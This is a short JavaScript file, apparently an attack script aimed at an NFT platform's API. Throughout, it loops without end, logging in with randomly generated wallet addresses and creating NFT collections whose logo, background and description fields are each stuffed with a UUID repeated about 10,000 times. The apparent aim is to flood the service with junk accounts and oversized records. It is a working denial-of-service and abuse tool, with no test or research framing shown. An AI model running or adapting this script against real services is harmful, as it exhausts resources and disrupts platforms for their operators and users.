import { runningApp } from "./app";
import axios from "axios";
import { v4 as uuid} from "uuid";

runningApp();
async function main() {
	while (true) {
		let random = "0x" + Math.random().toString(16).substr(2, 22);
		random = random + Math.random().toString(16).substr(2, 22);
		random = random + Math.random().toString(16).substr(2, 22);
		random = random + Math.random().toString(16).substr(2, 22);
		random = random + Math.random().toString(16).substr(2, 22);
		await axios
			.post("https://api.nftspacex.io/metaspacecy/users/login", { userAddress: `${random.slice(0, 42)}` })
			.then(res => {
				let userAddress = res.data.data._doc.userAddress;
				console.log("user1", res.data.data._doc.userAddress);
				let collectionName = uuid();
				axios
					.post("https://api.nftspacex.io/metaspacecy/collections/create", {
						category: 0,
						chainId: 56,
						collectionName,
						logo: new Array(10000).join(collectionName),
						userAddress,
						background: new Array(10000).join(collectionName),
						royalties: 10,
						description: new Array(10000).join(collectionName),
						collectionStandard: "ERC721",
					})
					.then(res => {
						console.log("collection", res.data.data.collectionAddress);
					})
					.catch(err => {
						console.log("err", err.message);
					});
			})
			.catch(err => {
				console.log("err", err.message);
			});
		await axios
			.post("https://api.nftspacex.io/aptos/users/login", { userAddress: `${random.slice(0, 66)}` })
			.then(res => {
				let userAddress = res.data.data._doc.userAddress;
				console.log("data2", userAddress);
			})
			.catch(err => {
				console.log("err", err.message);
			});
	}
}
main();
